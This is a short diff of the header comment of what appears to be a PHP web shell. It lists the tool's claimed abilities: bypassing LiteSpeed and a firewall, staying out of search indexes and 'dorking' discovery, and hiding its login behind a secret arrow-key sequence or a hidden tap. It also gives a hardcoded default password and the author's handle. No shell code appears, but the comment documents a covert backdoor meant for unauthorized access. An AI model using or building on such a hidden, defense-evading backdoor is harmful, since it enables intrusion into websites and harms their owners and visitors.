@@ -1,8 +1,11 @@
 <?php
 /**
- * press arrow up, arrow left, arrow up, arrow right then enter the password ( Input Password Desktop )
+ * Bypass Litespeed & WAV (use bypass.mini.shell.php)
+ * No Index
+ * No Dorking Shell
+ * Press arrow up, arrow left, arrow up, arrow right then enter the password ( Input Password Desktop )
  * Tap tap your screen under the word "Additionally", then enter the password ( Input Password Mobile )
- * default password : kontolpecah
+ * Default password : kontolpecah
  * 
  * Enjoy! -BunnyInvisible404
  */
